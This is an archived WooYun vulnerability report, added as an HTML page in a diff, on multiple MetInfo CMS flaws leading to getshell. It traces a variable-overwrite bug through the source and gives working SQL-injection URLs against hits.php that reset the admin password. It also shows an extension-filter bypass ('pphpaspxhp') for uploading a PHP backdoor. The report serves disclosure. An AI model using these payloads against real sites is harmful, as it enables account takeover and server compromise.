@@ -1,0 +1,322 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		metinfo多个漏洞(可getshell)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		metinfo多个漏洞(可getshell)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/b4dboy">b4dboy</a> 
+</li><li>提交时间：		2013-11-30 20:46</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-30：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2014-02-28：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">程序多个缺陷导致getshell</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1、审计代码我一般喜欢先看核心文件。<br />
+<br />
+</p><pre><code>define(&#039;MAGIC_QUOTES_GPC&#039;, get_magic_quotes_gpc());<br />
+isset($_REQUEST[&#039;GLOBALS&#039;]) &amp;&amp; exit(&#039;Access Error&#039;);<br />
+require_once ROOTPATH.&#039;include/global.func.php&#039;;<br />
+foreach(array(&#039;_COOKIE&#039;, &#039;_POST&#039;, &#039;_GET&#039;) as $_request) {<br />
+	foreach($$_request as $_key =&gt; $_value) {<br />
+		$_key{0} != &#039;_&#039; &amp;&amp; $$_key = daddslashes($_value);<br />
+	}<br />
+}</code></pre><p class='detail'><br />
+<br />
+include\common.inc.php 大概从21行开始程序使用了伪register_globals机制，<br />
+<br />
+程序判断了key的第一个字符是不是“_”来避免覆盖系统全局变量，以及使用自定义函数daddslashes来避免注入。<br />
+<br />
+</p><pre><code>function daddslashes($string, $force = 0,$metinfo) {<br />
+global $met_sqlinsert;<br />
+	!defined(&#039;MAGIC_QUOTES_GPC&#039;) &amp;&amp; define(&#039;MAGIC_QUOTES_GPC&#039;, get_magic_quotes_gpc());<br />
+	if(!MAGIC_QUOTES_GPC || $force) {<br />
+		if(is_array($string)) {<br />
+			foreach($string as $key =&gt; $val) {<br />
+				$string[$key] = daddslashes($val, $force);<br />
+			}<br />
+		} else {<br />
+			$string = addslashes($string);<br />
+		}<br />
+	}<br />
+	if(!is_array($string)){<br />
+		$string_old = $string;<br />
+		$string = str_ireplace(&quot;\&quot;&quot;,&quot;/&quot;,$string);<br />
+		$string = str_ireplace(&quot;&#039;&quot;,&quot;/&quot;,$string);<br />
+		$string = str_ireplace(&quot;*&quot;,&quot;/&quot;,$string);<br />
+		$string = str_ireplace(&quot;~&quot;,&quot;/&quot;,$string);<br />
+		$string = str_ireplace(&quot;select&quot;, &quot;\sel\ect&quot;, $string);<br />
+		$string = str_ireplace(&quot;insert&quot;, &quot;\ins\ert&quot;, $string);<br />
+		$string = str_ireplace(&quot;update&quot;, &quot;\up\date&quot;, $string);<br />
+		$string = str_ireplace(&quot;delete&quot;, &quot;\de\lete&quot;, $string);<br />
+		$string = str_ireplace(&quot;union&quot;, &quot;\un\ion&quot;, $string);<br />
+		$string = str_ireplace(&quot;into&quot;, &quot;\in\to&quot;, $string);<br />
+		$string = str_ireplace(&quot;load_file&quot;, &quot;\load\_\file&quot;, $string);<br />
+		$string = str_ireplace(&quot;outfile&quot;, &quot;\out\file&quot;, $string);<br />
+		$string_html=$string;<br />
+		$string = strip_tags($string);<br />
+		if($string_html!=$string){<br />
+			$string=&#039;&#039;;<br />
+		}<br />
+		$string = str_replace(&quot;%&quot;, &quot;\%&quot;, $string);     //   	<br />
+		/*<br />
+		if(strlen($string_html)!=strlen($string)){<br />
+			$reurl=&quot;http://&quot;.$_SERVER[&quot;HTTP_HOST&quot;];<br />
+			echo(&quot;&lt;script type=&#039;text/javascript&#039;&gt; alert(&#039;Submitted information is not legal!&#039;); location.href=&#039;$reurl&#039;; &lt;/script&gt;&quot;);<br />
+			die(&quot;Parameter Error！&quot;);<br />
+		}<br />
+		*/<br />
+		if(strlen($string_old)!=strlen($string)&amp;&amp;$met_sqlinsert){<br />
+			$reurl=&quot;http://&quot;.$_SERVER[&quot;HTTP_HOST&quot;];<br />
+			echo(&quot;&lt;script type=&#039;text/javascript&#039;&gt; alert(&#039;Submitted information is not legal!&#039;); location.href=&#039;$reurl&#039;; &lt;/script&gt;&quot;);<br />
+			die(&quot;Parameter Error！&quot;);<br />
+		}<br />
+		$string = trim($string);<br />
+	}<br />
+	if($id!=&quot;&quot;){<br />
+	if(!is_numeric($id)){<br />
+	$reurl=&quot;http://&quot;.$_SERVER[&quot;HTTP_HOST&quot;];<br />
+	echo(&quot;&lt;script type=&#039;text/javascript&#039;&gt; alert(&#039;Parameter Error！&#039;); location.href=&#039;$reurl&#039;; &lt;/script&gt;&quot;);<br />
+	die(&quot;Parameter Error！&quot;);<br />
+	}}<br />
+	if($class1!=&quot;&quot;){<br />
+	if(!is_numeric($class1)){<br />
+	$reurl=&quot;http://&quot;.$_SERVER[&quot;HTTP_HOST&quot;];<br />
+	echo(&quot;&lt;script type=&#039;text/javascript&#039;&gt; alert(&#039;Parameter Error！&#039;); location.href=&#039;$reurl&#039;; &lt;/script&gt;&quot;);<br />
+	die(&quot;Parameter Error！&quot;);<br />
+	}}<br />
+	if($class2!=&quot;&quot;){<br />
+	if(!is_numeric($class2)){<br />
+	$reurl=&quot;http://&quot;.$_SERVER[&quot;HTTP_HOST&quot;];<br />
+	echo(&quot;&lt;script type=&#039;text/javascript&#039;&gt; alert(&#039;Parameter Error！&#039;); location.href=&#039;$reurl&#039;; &lt;/script&gt;&quot;);<br />
+	die(&quot;Parameter Error！&quot;);<br />
+	}}<br />
+	if($class3!=&quot;&quot;){<br />
+	if(!is_numeric($class3)){<br />
+	$reurl=&quot;http://&quot;.$_SERVER[&quot;HTTP_HOST&quot;];<br />
+	echo(&quot;&lt;script type=&#039;text/javascript&#039;&gt; alert(&#039;Parameter Error！&#039;); location.href=&#039;$reurl&#039;; &lt;/script&gt;&quot;);<br />
+	die(&quot;Parameter Error！&quot;);<br />
+	}}   <br />
+	return $string;<br />
+}</code></pre><p class='detail'><br />
+<br />
+虽然无法覆盖系统全局变量，以及一些注入被过滤，但还是埋下了安全隐患。<br />
+<br />
+<br />
+<br />
+2、变量未初始化以及extract函数使用不当。<br />
+<br />
+在common.inc.php文件随后的代码里包含了一个config.inc.php的文件, 看名字就知道是一些初始化变量配置, 程序员将应用程序所需变量<br />
+<br />
+放在了register_globals机制之后声明估计就是怕变量被覆盖.但是config.inc.php的一个数组$settings却忘记了初始化.<br />
+<br />
+</p><pre><code>/*读配置数据*/<br />
+$query = &quot;SELECT * FROM $met_config WHERE lang=&#039;$lang&#039; or lang=&#039;metinfo&#039;&quot;;<br />
+$result = $db-&gt;query($query);<br />
+while($list_config= $db-&gt;fetch_array($result)){<br />
+	if($metinfoadminok)$list_config[&#039;value&#039;]=str_replace(&#039;&quot;&#039;, &#039;&amp;#34;&#039;, str_replace(&quot;&#039;&quot;, &#039;&amp;#39;&#039;,$list_config[&#039;value&#039;]));<br />
+	$settings_arr[]=$list_config;<br />
+	if($list_config[&#039;columnid&#039;]){<br />
+		$settings[$list_config[&#039;name&#039;].&#039;_&#039;.$list_config[&#039;columnid&#039;]]=$list_config[&#039;value&#039;];<br />
+	}else{<br />
+		$settings[$list_config[&#039;name&#039;]]=$list_config[&#039;value&#039;];<br />
+	}<br />
+	if($list_config[&#039;flashid&#039;]){<br />
+		$list_config[&#039;value&#039;]=explode(&#039;|&#039;,$list_config[&#039;value&#039;]);<br />
+		$falshval[&#039;type&#039;]=$list_config[&#039;value&#039;][0];<br />
+		$falshval[&#039;x&#039;]=$list_config[&#039;value&#039;][1];<br />
+		$falshval[&#039;y&#039;]=$list_config[&#039;value&#039;][2];<br />
+		$falshval[&#039;imgtype&#039;]=$list_config[&#039;value&#039;][3];<br />
+		$met_flasharray[$list_config[&#039;flashid&#039;]]=$falshval;<br />
+	}<br />
+}<br />
+@extract($settings);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+在没有初始化的情况下又使用了extract($settings),结合前面的register_globals机制这样就导致多个变量可以被覆盖掉从而控制整个程序逻辑.<br />
+<br />
+<br />
+<br />
+3、sql注入绕过。<br />
+<br />
+前面的防注入函数里可以看到替换了一些常用的关键字，使注入的难度增加了，但那仅仅只对sql语句的where之后注入有所防范。<br />
+<br />
+对于可以覆盖系统变量的咋们来讲就不太管用了而且无视GPC，sql注释符也没有过滤。<br />
+<br />
+为了降低攻击成本我挑了一处最容易实现攻击地方，一个update的sql语句。<br />
+<br />
+在 include\hits.php的25行左右。<br />
+<br />
+$query = &quot;update $met_hits SET hits=&#039;$hits_list[hits]&#039; where id=&#039;$id&#039;&quot;;<br />
+<br />
+覆盖掉$met_hits变量就可以update任何数据表，如修改管理员密码。<br />
+<br />
+hits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23<br />
+<br />
+使用密码1登陆后台拿shell，再把管理员密码改回来。<br />
+<br />
+hits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_pass=admin_introduction+WHERE+id=1%23<br />
+<br />
+<br />
+<br />
+4、上传饶过。<br />
+<br />
+刚刚说到的后台拿shell，前台也可以并且无须登验证，程序在多个地方存在上传功能，虽然使用了黑白名单的过滤机制但是并无完善。<br />
+<br />
+白名单可以使用前面的update注入点向met_config表添加一个我们想要上传的后缀即可。我们来看看黑名单。(job\uploadfile_save.php)<br />
+<br />
+</p><pre><code>$met_file_format=str_replace(&quot;php&quot;,&quot;&quot;,strtolower($met_file_format));<br />
+$met_file_format=str_replace(&quot;aspx&quot;,&quot;&quot;,strtolower($met_file_format));<br />
+$met_file_format=str_replace(&quot;asp&quot;,&quot;&quot;,strtolower($met_file_format));<br />
+$met_file_format=str_replace(&quot;jsp&quot;,&quot;&quot;,strtolower($met_file_format));<br />
+$met_file_format=str_replace(&quot;js&quot;,&quot;&quot;,strtolower($met_file_format));<br />
+if($met_file_format != &quot;&quot; &amp;&amp; !in_array(strtolower($ext), explode(&quot;|&quot;, strtolower($met_file_format)))){<br />
+	okinfo(&#039;javascript:history.go(-1);&#039;,$lang_js23);<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+$met_file_format是在数据库里设置的白名单，此处程序将一些常用脚本后缀给替换了，但是存在明显逻辑错误。<br />
+<br />
+错误1程序将危险后缀替换成空，错误2替换顺序混乱。如果我想上传php脚本后门只需要update白名单为：<br />
+<br />
+rar|zip|doc|pdf|jpg|xls|png|gif|mp3|jpeg|bmp|swf|flv|ico|pphpaspxhp<br />
+<br />
+<br />
+<br />
+pphpaspxhp经过第一轮替换变成paspxhp, 第二轮替换就变成了php. 文件名使用了时间+三位随机数字可以选择爆破也可以去后台直接查看文件名。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">修改管理员密码为1<br />
+<br />
+http://www.php0day.com/include/hits.php?type=img&amp;settings[met_img]=met_admin_table+SET+admin_introduction=admin_pass,admin_pass=md5(1)+WHERE+id=1%23 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">初始化变量，判断要严谨。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/b4dboy" title="b4dboy">b4dboy</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043795" title="metinfo多个漏洞(可getshell)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43795";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
